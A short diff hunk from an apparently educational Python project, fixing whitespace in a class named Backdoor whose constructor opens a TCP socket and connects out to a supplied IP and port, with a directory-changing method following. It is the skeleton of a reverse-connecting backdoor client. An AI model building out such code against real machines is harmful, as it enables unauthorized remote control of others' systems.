@@ -10,7 +10,7 @@ import base64, json, os, shutil, socket, subprocess, sys
 
 class Backdoor:
     def __init__ (self, ip, port, buffer_size): #constructor method
-        self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
         
     def change_working_directory_to(self, path):
